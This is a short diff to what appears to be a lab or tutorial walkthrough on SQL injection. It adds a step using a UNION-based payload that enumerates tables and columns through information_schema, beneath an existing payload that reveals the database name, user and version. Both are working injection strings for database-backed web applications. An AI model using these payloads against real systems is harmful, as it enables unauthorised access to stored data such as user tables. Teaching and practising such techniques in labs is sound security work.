@@ -7,3 +7,8 @@ Enter the following command to retrieve information about the database:
 
 `' union select null, null, database(), user(), @@version -- //`
 
+To get more information on what the database stores and type:
+
+`' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //`
+
+The results will list tables (products, users), the information the tables store and lastly the database name.
